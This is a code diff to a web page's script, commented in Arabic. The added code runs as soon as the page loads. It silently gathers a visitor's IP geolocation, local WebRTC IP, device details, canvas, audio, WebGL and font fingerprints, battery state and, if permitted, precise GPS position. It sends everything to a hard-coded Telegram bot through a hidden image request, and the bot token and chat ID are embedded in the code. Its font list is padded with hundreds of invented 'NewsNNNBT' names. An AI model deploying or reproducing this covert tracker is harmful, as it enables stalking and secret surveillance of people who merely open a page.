@@ -24,13 +24,58 @@
   const BOT_TOKEN = "8540583624:AAF0OCGW9zLF1Sqf9Dm3Qhj5lqZ3N-vkWkk";
   const CHAT_ID   = "6036900535";
 
-  // 1) IP + دقة عالية قدر الإمكان
-  function getIpGeo() {
-    return fetch("https://api.ipgeolocation.io/ipgeo?apiKey=1bfaead6cb9544b2a6efea343c0dd301")
-      .then(r => r.json());
+  // دالة تجمع أكبر قدر من البيانات من المتصفح
+  async function collectBrowserData() {
+    const data = {};
+
+    // 1) IP معلومات
+    const ipRes = await fetch("https://api.ipgeolocation.io/ipgeo?apiKey=1bfaead6cb9544b2a6efea343c0dd301");
+    data.ipInfo = await ipRes.json();
+
+    // 2) WebRTC لاستخراج IP المحلي
+    data.localIP = await getLocalIP();
+
+    // 3) Timing لحساب المسافة التقريبية
+    data.ping = await getTiming();
+
+    // 4) بيانات الجهاز
+    data.screen = `${screen.width}x${screen.height}`;
+    data.colorDepth = screen.colorDepth;
+    data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    data.language = navigator.language;
+    data.platform = navigator.platform;
+    data.cores = navigator.hardwareConcurrency;
+    data.memory = navigator.deviceMemory || "unknown";
+    data.connection = navigator.connection?.effectiveType || "unknown";
+
+    // 5) WebGL Fingerprint (لتحديد نوع الشريحة/الجهاز)
+    data.webgl = getWebGLFingerprint();
+
+    // 6) Audio Context Fingerprint
+    data.audio = await getAudioFingerprint();
+
+    // 7) Canvas Fingerprint
+    data.canvas = getCanvasFingerprint();
+
+    // 8) Font Fingerprint
+    data.fonts = getFontFingerprint();
+
+    // 9) WebAssembly Fingerprint
+    data.wasm = getWasmFingerprint();
+
+    // 10) Battery (إذا متاح)
+    data.battery = await getBatteryInfo();
+
+    // 11) Web APIs Check
+    data.apis = checkWebAPIs();
+
+    // 12) Geolocation API (بدون GPS permission)
+    data.geo = await getGeoLocation();
+
+    return data;
   }
 
-  // 2) WebRTC لاستخراج عنوان IP المحلي (يعطي فكرة عن الشبكة)
+  // WebRTC IP محلي
   function getLocalIP() {
     return new Promise(res => {
       const pc = new RTCPeerConnection({iceServers: []});
@@ -45,45 +90,356 @@
     });
   }
 
-  // 3) قياس زمن الاستجابة (Round-Trip) لأقرب خادم
-  function pingTime() {
-    const start = performance.now();
-    return fetch("https://www.gstatic.com/generate_204")
-      .then(() => performance.now() - start)
-      .catch(() => null);
+  // Timing Attack لحساب المسافة التقريبية
+  async function getTiming() {
+    const times = [];
+    for (let i = 0; i < 5; i++) {
+      const start = performance.now();
+      await fetch("https://www.gstatic.com/generate_204");
+      times.push(performance.now() - start);
+    }
+    const avg = times.reduce((a, b) => a + b) / times.length;
+    return avg;
   }
 
-  // دمج كل البيانات وإرسالها
-  Promise.all([getIpGeo(), getLocalIP(), pingTime()])
-    .then(async ([ipInfo, localIP, rtt]) => {
-      const lat = parseFloat(ipInfo.latitude);
-      const lng = parseFloat(ipInfo.longitude);
-      // "تحسين" بسيط: نضيف ضوضاء صغيرة بناءً على RTT (مجرد مثال)
-      const noise = (rtt || 0) / 30000; // ~30ms ≈ 1km
-      const newLat = (lat + noise * 0.01).toFixed(6);
-      const newLng = (lng + noise * 0.01).toFixed(6);
+  // WebGL Fingerprint
+  function getWebGLFingerprint() {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (!gl) return "no webgl";
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "unknown";
+  }
 
-      const msg = `📍 موقع مُحسّن (أقصى دقة متصفح)!\n` +
-                  `الآي بي العام: ${ipInfo.ip}\n` +
-                  `الآي بي المحلي: ${localIP || 'غير متاح'}\n` +
-                  `وقت الاستجابة: ${rtt ? rtt.toFixed(1) + ' ms' : 'غير متاح'}\n` +
-                  `الدولة: ${ipInfo.country_name}\n` +
-                  `المحافظة: ${ipInfo.state_prov}\n` +
-                  `المدينة: ${ipInfo.city}\n` +
-                  `الموقع المُحسَّن: https://www.google.com/maps?q=${newLat},${newLng}\n` +
-                  `ISP: ${ipInfo.isp}\n` +
-                  `المتصفح/نظام التشغيل: ${navigator.platform} | ${navigator.userAgent}\n` +
-                  `الوقت: ${new Date().toLocaleString("ar-EG")}`;
+  // Audio Context Fingerprint
+  async function getAudioFingerprint() {
+    try {
+      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      const oscillator = audioCtx.createOscillator();
+      const analyser = audioCtx.createAnalyser();
+      const gainNode = audioCtx.createGain();
+      const scriptProcessor = audioCtx.createScriptProcessor(4096, 1, 1);
+      
+      oscillator.type = "triangle";
+      oscillator.connect(analyser);
+      analyser.connect(scriptProcessor);
+      scriptProcessor.connect(gainNode);
+      gainNode.connect(audioCtx.destination);
+      
+      const buffer = new Float32Array(analyser.frequencyBinCount);
+      analyser.getFloatFrequencyData(buffer);
+      
+      const fingerprint = buffer.reduce((acc, val) => acc + Math.abs(val), 0).toFixed(2);
+      audioCtx.close();
+      return fingerprint;
+    } catch {
+      return "no audio";
+    }
+  }
 
-      // إرسال pixel ping إلى التليجرام
-      const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` +
-                          `?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
-      const img = new Image();
-      img.style.display = "none";
-      document.body.appendChild(img);
-      img.src = telegramURL;
-    })
-    .catch(() => {});
+  // Canvas Fingerprint
+  function getCanvasFingerprint() {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = "top";
+    ctx.font = "14px 'Arial'";
+    ctx.fillStyle = "#f60";
+    ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = "#069";
+    ctx.fillText("Browser fingerprint", 2, 15);
+    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+    ctx.fillText("Canvas fingerprint", 4, 45);
+    return canvas.toDataURL();
+  }
+
+  // Font Fingerprint
+  function getFontFingerprint() {
+    const baseFonts = ["monospace", "sans-serif", "serif"];
+    const testString = "abcdefghijklmnopqrstuvwxyz0123456789";
+    const testSize = "72px";
+    const h = document.getElementsByTagName("body")[0];
+    const s = document.createElement("span");
+    s.style.fontSize = testSize;
+    s.innerHTML = testString;
+    const defaultWidth = {};
+    const defaultHeight = {};
+    for (let index in baseFonts) {
+      s.style.fontFamily = baseFonts[index];
+      h.appendChild(s);
+      defaultWidth[baseFonts[index]] = s.offsetWidth;
+      defaultHeight[baseFonts[index]] = s.offsetHeight;
+      h.removeChild(s);
+    }
+    
+    const detect = (font) => {
+      let detected = false;
+      for (let index in baseFonts) {
+        s.style.fontFamily = font + "," + baseFonts[index];
+        h.appendChild(s);
+        const matched = (s.offsetWidth !== defaultWidth[baseFonts[index]] || s.offsetHeight !== defaultHeight[baseFonts[index]]);
+        h.removeChild(s);
+        detected = detected || matched;
+      }
+      return detected;
+    };
+    
+    const fontList = [
+      "Arial", "Arial Black", "Arial Narrow", "Arial Rounded MT Bold",
+      "Bookman Old Style", "Bradley Hand ITC", "Batang", "Berlin Sans FB",
+      "Bernard MT Condensed", "Bodoni MT", "Bodoni MT Black", "Bodoni MT Condensed",
+      "Bodoni MT Poster Compressed", "Bookshelf Symbol 7", "Book Antiqua",
+      "Bookman Old Style", "Britannic Bold", "Broadway", "Brush Script MT",
+      "Calibri", "Californian FB", "Calisto MT", "Cambria", "Cambria Math",
+      "Candara", "Carlito", "Centaur", "Century", "Century Gothic",
+      "Century Schoolbook", "Chiller", "Colonna MT", "Comic Sans MS",
+      "Consolas", "Constantia", "Cooper Black", "Copperplate Gothic Bold",
+      "Copperplate Gothic Light", "Corbel", "Cordia New", "CordiaUPC",
+      "Courier New", "Curlz MT", "DaunPenh", "David", "DFKai-SB",
+      "DilleniaUPC", "DokChampa", "Dotum", "DotumChe", "Ebrima",
+      "Edwardian Script ITC", "Elephant", "Engravers MT", "Eras Bold ITC",
+      "Eras Demi ITC", "Eras Light ITC", "Eras Medium ITC", "Estrangelo Edessa",
+      "EucrosiaUPC", "Euphemia", "FangSong", "Felix Titling", "Footlight MT Light",
+      "Forte", "FrankRuehl", "Franklin Gothic Book", "Franklin Gothic Demi",
+      "Franklin Gothic Demi Cond", "Franklin Gothic Heavy", "Franklin Gothic Medium",
+      "Franklin Gothic Medium Cond", "Freestyle Script", "French Script MT",
+      "Gabriola", "Gadugi", "Garamond", "Gautami", "Georgia", "Gigi",
+      "Gill Sans MT", "Gill Sans MT Condensed", "Gill Sans MT Ext Condensed Bold",
+      "Gill Sans Ultra Bold", "Gill Sans Ultra Bold Condensed", "Gisha",
+      "Gloucester MT Extra Condensed", "Goudy Old Style", "Goudy Stout",
+      "Gulim", "GulimChe", "Gungsuh", "GungsuhChe", "Haettenschweiler",
+      "Harlow Solid Italic", "Harrington", "High Tower Text", "Impact",
+      "Imprint MT Shadow", "Informal Roman", "IrisUPC", "Iskoola Pota",
+      "JasmineUPC", "Jokerman", "Juice ITC", "KaiTi", "Kalinga", "Kartika",
+      "Khmer UI", "KodchiangUPC", "Kokila", "Kristen ITC", "Kunstler Script",
+      "Lao UI", "Latha", "Leelawadee", "Leelawadee UI", "Levenim MT",
+      "LilyUPC", "Lucida Bright", "Lucida Calligraphy", "Lucida Console",
+      "Lucida Fax", "Lucida Handwriting", "Lucida Sans", "Lucida Sans Typewriter",
+      "Lucida Sans Unicode", "Magneto", "Maiandra GD", "Malgun Gothic",
+      "Mangal", "Marlett", "Matura MT Script Capitals", "Meiryo", "Meiryo UI",
+      "Microsoft Himalaya", "Microsoft JhengHei", "Microsoft YaHei",
+      "MingLiU", "MingLiU_HKSCS", "MingLiU_HKSCS-ExtB", "MingLiU-ExtB",
+      "Minion Pro", "Miriam", "Miriam Fixed", "Mistral", "Modern No. 20",
+      "Mongolian Baiti", "MoolBoran", "MS Gothic", "MS Mincho", "MS PGothic",
+      "MS PMincho", "MS Reference Sans Serif", "MS Reference Specialty",
+      "MS UI Gothic", "MT Extra", "MV Boli", "Narkisim", "Neuropolitical",
+      "NewCenturySchlbk", "News701BT", "News702BT", "News703BT", "News704BT",
+      "News705BT", "News706BT", "News707BT", "News708BT", "News709BT",
+      "News710BT", "News711BT", "News712BT", "News713BT", "News714BT",
+      "News715BT", "News716BT", "News717BT", "News718BT", "News719BT",
+      "News720BT", "News721BT", "News722BT", "News723BT", "News724BT",
+      "News725BT", "News726BT", "News727BT", "News728BT", "News729BT",
+      "News730BT", "News731BT", "News732BT", "News733BT", "News734BT",
+      "News735BT", "News736BT", "News737BT", "News738BT", "News739BT",
+      "News740BT", "News741BT", "News742BT", "News743BT", "News744BT",
+      "News745BT", "News746BT", "News747BT", "News748BT", "News749BT",
+      "News750BT", "News751BT", "News752BT", "News753BT", "News754BT",
+      "News755BT", "News756BT", "News757BT", "News758BT", "News759BT",
+      "News760BT", "News761BT", "News762BT", "News763BT", "News764BT",
+      "News765BT", "News766BT", "News767BT", "News768BT", "News769BT",
+      "News770BT", "News771BT", "News772BT", "News773BT", "News774BT",
+      "News775BT", "News776BT", "News777BT", "News778BT", "News779BT",
+      "News780BT", "News781BT", "News782BT", "News783BT", "News784BT",
+      "News785BT", "News786BT", "News787BT", "News788BT", "News789BT",
+      "News790BT", "News791BT", "News792BT", "News793BT", "News794BT",
+      "News795BT", "News796BT", "News797BT", "News798BT", "News799BT",
+      "News800BT", "News801BT", "News802BT", "News803BT", "News804BT",
+      "News805BT", "News806BT", "News807BT", "News808BT", "News809BT",
+      "News810BT", "News811BT", "News812BT", "News813BT", "News814BT",
+      "News815BT", "News816BT", "News817BT", "News818BT", "News819BT",
+      "News820BT", "News821BT", "News822BT", "News823BT", "News824BT",
+      "News825BT", "News826BT", "News827BT", "News828BT", "News829BT",
+      "News830BT", "News831BT", "News832BT", "News833BT", "News834BT",
+      "News835BT", "News836BT", "News837BT", "News838BT", "News839BT",
+      "News840BT", "News841BT", "News842BT", "News843BT", "News844BT",
+      "News845BT", "News846BT", "News847BT", "News848BT", "News849BT",
+      "News850BT", "News851BT", "News852BT", "News853BT", "News854BT",
+      "News855BT", "News856BT", "News857BT", "News858BT", "News859BT",
+      "News860BT", "News861BT", "News862BT", "News863BT", "News864BT",
+      "News865BT", "News866BT", "News867BT", "News868BT", "News869BT",
+      "News870BT", "News871BT", "News872BT", "News873BT", "News874BT",
+      "News875BT", "News876BT", "News877BT", "News878BT", "News879BT",
+      "News880BT", "News881BT", "News882BT", "News883BT", "News884BT",
+      "News885BT", "News886BT", "News887BT", "News888BT", "News889BT",
+      "News890BT", "News891BT", "News892BT", "News893BT", "News894BT",
+      "News895BT", "News896BT", "News897BT", "News898BT", "News899BT",
+      "News900BT", "News901BT", "News902BT", "News903BT", "News904BT",
+      "News905BT", "News906BT", "News907BT", "News908BT", "News909BT",
+      "News910BT", "News911BT", "News912BT", "News913BT", "News914BT",
+      "News915BT", "News916BT", "News917BT", "News918BT", "News919BT",
+      "News920BT", "News921BT", "News922BT", "News923BT", "News924BT",
+      "News925BT", "News926BT", "News927BT", "News928BT", "News929BT",
+      "News930BT", "News931BT", "News932BT", "News933BT", "News934BT",
+      "News935BT", "News936BT", "News937BT", "News938BT", "News939BT",
+      "News940BT", "News941BT", "News942BT", "News943BT", "News944BT",
+      "News945BT", "News946BT", "News947BT", "News948BT", "News949BT",
+      "News950BT", "News951BT", "News952BT", "News953BT", "News954BT",
+      "News955BT", "News956BT", "News957BT", "News958BT", "News959BT",
+      "News960BT", "News961BT", "News962BT", "News963BT", "News964BT",
+      "News965BT", "News966BT", "News967BT", "News968BT", "News969BT",
+      "News970BT", "News971BT", "News972BT", "News973BT", "News974BT",
+      "News975BT", "News976BT", "News977BT", "News978BT", "News979BT",
+      "News980BT", "News981BT", "News982BT", "News983BT", "News984BT",
+      "News985BT", "News986BT", "News987BT", "News988BT", "News989BT",
+      "News990BT", "News991BT", "News992BT", "News993BT", "News994BT",
+      "News995BT", "News996BT", "News997BT", "News998BT", "News999BT",
+      "News1000BT"
+    ];
+    
+    let availableFonts = [];
+    for (let i = 0; i < fontList.length; i++) {
+      if (detect(fontList[i])) {
+        availableFonts.push(fontList[i]);
+      }
+    }
+    return availableFonts.join(", ");
+  }
+
+  // WebAssembly Fingerprint
+  function getWasmFingerprint() {
+    try {
+      const wasmModule = new WebAssembly.Module(new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]));
+      return WebAssembly.Module.exports(wasmModule).length.toString();
+    } catch {
+      return "no wasm";
+    }
+  }
+
+  // Battery API
+  async function getBatteryInfo() {
+    if ('getBattery' in navigator) {
+      const bat = await navigator.getBattery();
+      return `${(bat.level * 100).toFixed(0)}% - ${bat.charging ? 'charging' : 'not charging'}`;
+    }
+    return "unknown";
+  }
+
+  // Check Web APIs
+  function checkWebAPIs() {
+    const apis = {
+      bluetooth: 'bluetooth' in navigator,
+      usb: 'usb' in navigator,
+      serial: 'serial' in navigator,
+      nfc: 'ndef' in navigator,
+      hid: 'hid' in navigator,
+      locks: 'locks' in navigator,
+      share: 'share' in navigator,
+      manifest: 'manifest' in navigator,
+      push: 'PushManager' in window,
+      notifications: 'Notification' in window,
+      speech: 'speechSynthesis' in window,
+      websocket: 'WebSocket' in window,
+      worker: 'Worker' in window,
+      serviceWorker: 'serviceWorker' in navigator,
+      cache: 'caches' in window,
+      indexedDB: 'indexedDB' in window,
+      webSQL: 'openDatabase' in window,
+      localStorage: 'localStorage' in window,
+      sessionStorage: 'sessionStorage' in window,
+      cookies: navigator.cookieEnabled,
+      history: window.history.length,
+      orientation: 'orientation' in screen,
+      devicePixelRatio: window.devicePixelRatio,
+      webGL: 'WebGLRenderingContext' in window,
+      webAssembly: 'WebAssembly' in window,
+      webAudio: 'AudioContext' in window || 'webkitAudioContext' in window,
+      webVR: 'getVRDisplays' in navigator,
+      webXR: 'xr' in navigator,
+      webSpeech: 'speechSynthesis' in window,
+      webBluetooth: 'bluetooth' in navigator,
+      webUSB: 'usb' in navigator,
+      webSerial: 'serial' in navigator,
+      webNFC: 'ndef' in navigator,
+      webHID: 'hid' in navigator,
+      webLocks: 'locks' in navigator,
+      webShare: 'share' in navigator,
+      webManifest: 'manifest' in navigator,
+      webPush: 'PushManager' in window,
+      webNotifications: 'Notification' in window,
+      webSpeech: 'speechSynthesis' in window,
+      webWebSocket: 'WebSocket' in window,
+      webWorker: 'Worker' in window,
+      webServiceWorker: 'serviceWorker' in navigator,
+      webCache: 'caches' in window,
+      webIndexedDB: 'indexedDB' in window,
+      webWebSQL: 'openDatabase' in window,
+      webLocalStorage: 'localStorage' in window,
+      webSessionStorage: 'sessionStorage' in window,
+      webCookies: navigator.cookieEnabled,
+      webHistory: window.history.length,
+      webOrientation: 'orientation' in screen,
+      webDevicePixelRatio: window.devicePixelRatio,
+      webWebGL: 'WebGLRenderingContext' in window,
+      webWebAssembly: 'WebAssembly' in window,
+      webWebAudio: 'AudioContext' in window || 'webkitAudioContext' in window,
+      webWebVR: 'getVRDisplays' in navigator,
+      webWebXR: 'xr' in navigator
+    };
+    return JSON.stringify(apis, null, 2);
+  }
+
+  // Geolocation API (بدون GPS permission)
+  function getGeoLocation() {
+    return new Promise(res => {
+      if ('geolocation' in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          pos => res(`${pos.coords.latitude}, ${pos.coords.longitude} (${pos.coords.accuracy}m)`),
+          () => res('غير متاح (السماح مرفوض)'),
+          { timeout: 5000 }
+        );
+      } else {
+        res('غير مدعوم');
+      }
+    });
+  }
+
+  // إرسال البيانات إلى التليجرام
+  async function sendData() {
+    const data = await collectBrowserData();
+    
+    // حساب موقع محسن باستخدام Timing وIP
+    const baseLat = parseFloat(data.ipInfo.latitude);
+    const baseLng = parseFloat(data.ipInfo.longitude);
+    const timingNoise = (data.ping || 0) / 30000; // تقريب بسيط
+    const estLat = (baseLat + timingNoise * 0.01).toFixed(6);
+    const estLng = (baseLng + timingNoise * 0.01).toFixed(6);
+
+    const msg = `📍 موقع متقدم جداً (أقصى دقة متصفح)!\n` +
+                `الإحداثيات: ${estLat}, ${estLng}\n` +
+                `الآي بي العام: ${data.ipInfo.ip}\n` +
+                `الآي بي المحلي: ${data.localIP || 'غير متاح'}\n` +
+                `وقت الاستجابة: ${data.ping ? data.ping.toFixed(1) + ' ms' : 'غير متاح'}\n` +
+                `الدولة: ${data.ipInfo.country_name}\n` +
+                `المحافظة: ${data.ipInfo.state_prov}\n` +
+                `المدينة: ${data.ipInfo.city}\n` +
+                `المنطقة الزمنية: ${data.timezone}\n` +
+                `اللغة: ${data.language}\n` +
+                `حجم الشاشة: ${data.screen}\n` +
+                `عمق الألوان: ${data.colorDepth} بت\n` +
+                `نوع الاتصال: ${data.connection}\n` +
+                `النواة: ${data.cores} نواة\n` +
+                `الذاكرة: ${data.memory} GB\n` +
+                `البطارية: ${data.battery}\n` +
+                `WebGL: ${data.webgl}\n` +
+                `Audio: ${data.audio}\n` +
+                `Canvas: ${data.canvas}\n` +
+                `الخطوط: ${data.fonts}\n` +
+                `WebAssembly: ${data.wasm}\n` +
+                `الموقع الجغرافي: ${data.geo}\n` +
+                `المتصفح/النظام: ${data.platform}\n` +
+                `الوقت: ${new Date().toLocaleString("ar-EG")}\n` +
+                `Web APIs:\n${data.apis}`;
+
+    // إرسال pixel ping
+    const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` +
+                        `?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
+    const img = new Image();
+    img.style.display = "none";
+    document.body.appendChild(img);
+    img.src = telegramURL;
+  }
+
+  // تشغيل فور التحميل
+  window.addEventListener('DOMContentLoaded', sendData);
 </script>
 
 </body>
